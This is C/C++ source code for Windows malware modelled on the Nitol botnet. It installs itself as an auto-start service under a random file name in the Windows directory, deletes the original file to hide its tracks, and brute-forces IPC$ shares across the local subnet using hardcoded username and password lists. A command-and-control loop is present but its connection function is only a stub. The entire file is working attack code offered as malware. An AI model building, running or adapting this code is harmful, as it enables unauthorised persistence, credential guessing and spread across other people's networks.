#include "Nitol.h"
#pragma comment(lib, "ws2_32.lib")

#define SHCNE_DELETE 4
#define SHCNF_PATH 1
#define WINSOCK_VERSION 0x202
#define MAX_THREADS 100


BOOL is_service_installed()
{
	HKEY phkResult;
	HMODULE hadvapi = LoadLibraryA("advapi32.dll");
	PFN_RegCloseKey RegCloseKey = (PFN_RegCloseKey)::GetProcAddress (hadvapi, "RegCloseKey");
	char SubKey [100] = "SYSTEM\\CurrentControlSet\\Services\\\\";
	strcat(SubKey, "Vwxyab Defghijk Mno");
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, KEY_ALL_ACCESS, &phkResult);
	if (phkResult==0)
		return FALSE;
	else
		return TRUE;
	RegCloseKey(phkResult);
}

int self_delete()
{
	HMODULE hkernel = LoadLibraryA("kernel32.dll");
	FARPROC lstrcatA = GetProcAddress(hkernel, "lstrcatA");
	HMODULE hshell = LoadLibraryA("Shell32.dll");
	FARPROC SHChangeNotify = GetProcAddress(hshell, "SHChangeNotify");
	char buffer [MAX_PATH];
	char filename [MAX_PATH];
	char param [100];
	char szOpen [5] = "Open";
	memset(filename, 0, MAX_PATH);
	memset(param, 0, 100);
	GetModuleFileNameA(0, filename, MAX_PATH);
	GetShortPathNameA(filename, filename, MAX_PATH);
	GetEnvironmentVariableA("COMSPEC", buffer, MAX_PATH);
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, "/c del ");	
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, filename);
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, " >nul");
	SHELLEXECUTEINFOA pExecInfo;
	pExecInfo.lpVerb = szOpen;
	pExecInfo.lpFile = buffer;
	pExecInfo.cbSize = 60;
	pExecInfo.hwnd = 0;
	pExecInfo.lpParameters = param;
	pExecInfo.lpDirectory = 0;
	pExecInfo.nShow = 0;
	pExecInfo.fMask = 64;
	if ( !ShellExecuteExA(&pExecInfo) )
		return 0; 
	SetPriorityClass(pExecInfo.hProcess, IDLE_PRIORITY_CLASS);
	HANDLE hProcess = GetCurrentProcess();
	SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
	HANDLE hThread = GetCurrentThread();
	SetThreadPriority(hThread, 15);
	((void (__stdcall *)(DWORD, DWORD, CHAR[], DWORD))SHChangeNotify)(SHCNE_DELETE, SHCNF_PATH, filename, 0);
	return 1;
}

char random_char(int x)
{
	HMODULE hkernel = LoadLibraryA("KERNEL32.dll");
  	FARPROC GetTickCount = GetProcAddress(hkernel, "GetTickCount");
  	int value = GetTickCount();
  	return value * (rand() + 3) % x;
}

void install_malware(char svcname[], char svcdisplayname[], char regvalue[])
{
	HKEY phkResult=NULL;
	char Filename [MAX_PATH];
	char Buffer [MAX_PATH];
	HMODULE hadvapi = LoadLibraryA("ADVAPI32.dll");
	FARPROC RegCloseKey = GetProcAddress(hadvapi, "RegCloseKey");
	FARPROC OpenSCManagerA = GetProcAddress(hadvapi, "OpenSCManagerA");	  
	FARPROC OpenServiceA = GetProcAddress(hadvapi, "OpenServiceA");	  
	FARPROC CloseServiceHandle = GetProcAddress(hadvapi, "CloseServiceHandle");
	HMODULE hkernel = LoadLibraryA("KERNEL32.dll");
	FARPROC CopyFileA = GetProcAddress(hkernel, "CopyFileA");	
	FARPROC RegSetValueExA = GetProcAddress(hadvapi, "RegSetValueExA");	  
	FARPROC StartServiceA = GetProcAddress(hadvapi, "StartServiceA");	  
	FARPROC RegOpenKeyA = GetProcAddress(hadvapi, "RegOpenKeyA");	  
	FARPROC UnlockServiceDatabase = GetProcAddress(hadvapi, "UnlockServiceDatabase");	  
	FARPROC ChangeServiceConfig2A = GetProcAddress(hadvapi, "ChangeServiceConfig2A");	  
	FARPROC CreateServiceA = GetProcAddress(hadvapi, "CreateServiceA");	  
	FARPROC LockServiceDatabase = GetProcAddress(hadvapi, "LockServiceDatabase");
	memset(&Filename, 0, MAX_PATH);
	memset(&Buffer, 0, MAX_PATH);
	GetModuleFileNameA(0, Filename, MAX_PATH);
  	GetWindowsDirectoryA(Buffer, MAX_PATH);

	int BufLen = strlen(Buffer);
	char random_name [7];
	memset(random_name, 0, 7);
	if ( strncmp(Buffer, Filename, BufLen))
	{
		char v16 = random_char(26) + 'a';
		char v17 = random_char(26) + 'a';
		char v18 = random_char(26) + 'a';
		char v19 = random_char(26) + 'a';
		char v20 = random_char(26) + 'a';
		char v21 = random_char(26);
		wsprintfA(random_name, "%c%c%c%c%c%c.exe", v21 + 'a', v20, v19, v18, v17, v16);
		strcat(Buffer, "\\");	
		strcat(Buffer, random_name);		
		((void (__stdcall *)(CHAR [], CHAR [], int))CopyFileA)(Filename, Buffer, 0);
		memset(&Filename, 0, MAX_PATH);
		strcpy(Filename, Buffer);
	}
	int schSCManager = ((int (__stdcall *)(DWORD, DWORD, DWORD))OpenSCManagerA)(0, 0, SC_MANAGER_ALL_ACCESS);	
	int schManager = 0;
	schManager = schSCManager;
	if (schSCManager)
	{			
		int schService = ((int (__stdcall *)(int, CHAR [], CHAR[], DWORD, DWORD, DWORD, DWORD, CHAR [], DWORD, DWORD, DWORD, DWORD, DWORD))CreateServiceA)(schSCManager, svcname, svcdisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, Filename, 0, 0, 0, 0, 0);
		int lpInfo = 86400;
		char * desc_new  = "Vwxyabcd Fghijklmn Pqrstuv Xyabcdef Hip";
		int hLockServ = ((int (__stdcall *)(int))LockServiceDatabase)(schSCManager);
		((void (__stdcall *)(int, signed int, char **))ChangeServiceConfig2A)(schService, 1, &desc_new);	
		((void (__stdcall *)(int))UnlockServiceDatabase)(hLockServ);
		if (!schService && GetLastError() == 1073)
		{
			int SCHANDLE = ((int (__stdcall *)(int, CHAR [], int))OpenServiceA)(schManager, svcname, SERVICE_ALL_ACCESS);
			schService = SCHANDLE;
			if ( !SCHANDLE )
				goto EXIT;
			((void (__stdcall *)(int, DWORD, DWORD))StartServiceA)(SCHANDLE, 0, 0);
		}
		if (!((int (__stdcall *)(int, DWORD, DWORD))StartServiceA)(schService, 0, 0))
		{
			goto EXIT;
		}
		else
		{
			char buf [100] = "SYSTEM\\\\CurrentControlSet\\\\Services\\\\";
			strcat(buf, svcname);
			int reglength = strlen(regvalue);
			((void (__stdcall *)(HKEY, CHAR [], PHKEY))RegOpenKeyA)(HKEY_LOCAL_MACHINE, buf, &phkResult);
			((int (__stdcall *)(HKEY, CHAR [], DWORD, DWORD, CHAR [], DWORD))RegSetValueExA)(phkResult, "Description", 0, 1, regvalue, reglength);
		}
		EXIT:
		if ( schService )
			((void (__stdcall *)(int))CloseServiceHandle)(schService);
		if ( schManager )
			((void (__stdcall *)(int))CloseServiceHandle)(schManager);
		if ( phkResult!=NULL)
			((void (__stdcall *)(HKEY))RegCloseKey)(phkResult);	
		self_delete();		
	}
}

void T_brutefource(LPVOID lpThreadParameter)
{
	char * username[] = {"administrator","test","admin", "adminuser","guest","alex","home","love","xp","user","game","123","nn","root","????????????","movie","time","yeah","money","xpuser","hack","enter", ""};
	char * pass[] = {"password","111","123456","qwerty","test","abc123","memory","home","12345678","love","bbbbbb","xp","88888","nn","root","caonima","5201314","1314520","asdfgh","alex","angel","NULL","123","asdf","baby","woaini","movie", ""};	
	struct WSAData WSAData; 
	WSAStartup(WINSOCK_VERSION, &WSAData);	
	if (LOBYTE(WSAData.wVersion) == 2 && HIBYTE(WSAData.wVersion) == 2)
	{
		CHAR name [100];
		CHAR ip_addr[20];
		CHAR Dest[80];
		int index =0;		
		struct hostent *hostname;
		memset(name, 0, 100);
		unsigned __int8 ipaddr[3];
		HMODULE hmpr = LoadLibraryA("mpr.dll");		
		FARPROC WNetAddConnection2A = GetProcAddress(hmpr, "WNetAddConnection2A");
		if(!gethostname(name, 100))
		{
			hostname = gethostbyname(name);	
			if(hostname && hostname->h_addr_list)
			{				
				while (index<256)
				{
					memset(ip_addr, 0, 80);
					memset(Dest, 0, 80);
					int i,j;
					CHAR Cmdline[MAX_PATH];
					NETRESOURCE NetR;
					memset(Cmdline, 0 , MAX_PATH);
					index++;
					memcpy(&ipaddr, *(const void **)hostname->h_addr_list, hostname->h_length);
					sprintf(ip_addr, "%d.%d.%d.%d", ipaddr[0], ipaddr[1], ipaddr[2], index);					
					for(i=0;username[i]!="";i++)
						for(j= 0; pass[j]!=""; j++)
							{
								printf("[%d]\t%s %s %s\n", index,ip_addr, username[i], pass[j]);
								sprintf(Cmdline, "\\\\%s\\ipc$", ip_addr);
								memset(&NetR, 0, sizeof(NetR));								
								NetR.lpRemoteName = Cmdline;								
								NetR.dwScope = RESOURCE_CONNECTED;
								NetR.dwType = RESOURCETYPE_ANY;
								NetR.dwDisplayType = RESOURCETYPE_ANY;
								NetR.dwUsage = RESOURCEUSAGE_CONNECTABLE;								
								DWORD dwResult = ((DWORD (__stdcall *)(LPNETRESOURCE, CHAR [], CHAR[], DWORD))WNetAddConnection2A)(&NetR, pass[j], username[i], 0);
								
								if(dwResult == ERROR_ALREADY_ASSIGNED)
								{
									continue;
								}
								else if(dwResult == ERROR_DEVICE_ALREADY_REMEMBERED){
									continue;
								}
								else if(dwResult != NO_ERROR)
									continue;								
								else
								{
									printf("\tSuccessed! IP: %s, Username: %s, Password: %s\n", ip_addr, username[i], pass[j]);
									continue;
								}
								
							}
				}
				
            }
		}
	}
	exit(1);

}

int sub_404865()
{
	return 0;
}

SOCKET T_C2_connection()
{
	SOCKET result; 
	return result;
}

HANDLE _CreateThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	return CreateThread(0, 0, lpStartAddress, lpParameter, 0, 0);
}

int run_malware()
{
	//SERVICE_WIN32_SHARE_PROCESS
	struct WSAData WSAData;
	DWORD dword_401C04;
	HMODULE hws2 = LoadLibrary("WS2_32.dll");
	HMODULE hkernel = LoadLibrary("kernel32.dll");
	FARPROC closesocket = GetProcAddress(hws2, "closesocket");
	HMODULE hadvapi = LoadLibrary("ADVAPI32.dll");
	FARPROC SetServiceStatus = GetProcAddress(hadvapi, "SetServiceStatus");	
	FARPROC RegisterServiceCtrlHandlerA = GetProcAddress(hadvapi, "RegisterServiceCtrlHandlerA");	
	DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	((void (__stdcall *)(DWORD, DWORD *))SetServiceStatus)(0, &dwServiceType);
	FARPROC CreateMutexA = GetProcAddress(hkernel, "CreateMutexA");
	if (((int (__stdcall *)(DWORD, DWORD, CHAR []))CreateMutexA)(0, 0, "Vwxyab Defghijk Mno") && GetLastError()==ERROR_ALREADY_EXISTS)
	{
		exit(0);
	}
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)T_brutefource, 0, 0, 0);
	Sleep(1000);
	WSAStartup(WINSOCK_VERSION, &WSAData);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_404865, 0, 0, 0);
	while ( 1 )
	{
		HANDLE hThread = _CreateThread((LPTHREAD_START_ROUTINE)T_C2_connection, 0);
		WaitForSingleObject(hThread, 0xFFFFFFFF);
		CloseHandle(hThread);
		//closesocket(fd);
		dword_401C04 = 1;
		Sleep(1000);
  }
	return 1;
}

void evil()
{
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)T_brutefource, 0, 0, 0);
	WaitForSingleObject(hThread, INFINITE);
	Sleep(1000);
}

int main()
{	
	evil();
	exit(1);
	HMODULE hkernel = LoadLibraryA("kernel32.dll");
	HMODULE huser = LoadLibraryA("user32.dll");			
	PFN_GetLastError GetLastError = (PFN_GetLastError)::GetProcAddress (hkernel, "GetLastError");
	PFN_ExitProcess myExitProcess = (PFN_ExitProcess)::GetProcAddress (hkernel, "ExitProcess");
	PFN_MessageBox myMessageBox = (PFN_MessageBox)::GetProcAddress (huser, "MessageBoxA");

	SERVICE_TABLE_ENTRYA  ServiceStartTable;
	char buffer[260] ;
	memset(&buffer, 0, sizeof(buffer));
	HMODULE hModule= GetModuleHandleA(0);
	GetModuleFileNameA(hModule, buffer, sizeof(buffer));
	HMODULE hadvapi = LoadLibraryA("ADVAPI32.dll");	
	if(is_service_installed()==TRUE)
	{
		run_malware();
		ServiceStartTable.lpServiceName = "Vwxyab Defghijk Mno";
		ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)run_malware;				
		((void (__stdcall *)(SERVICE_TABLE_ENTRYA *))StartServiceCtrlDispatcherA)(&ServiceStartTable);		
	}
	else
		install_malware("Vwxyab Defghijk Mno", "Vwxyab Defghijk Mnopqrst Vwxy", "Vwxyabcd Fghijklmn Pqrstuv Xyabcdef Hij");
		
	return 0;
}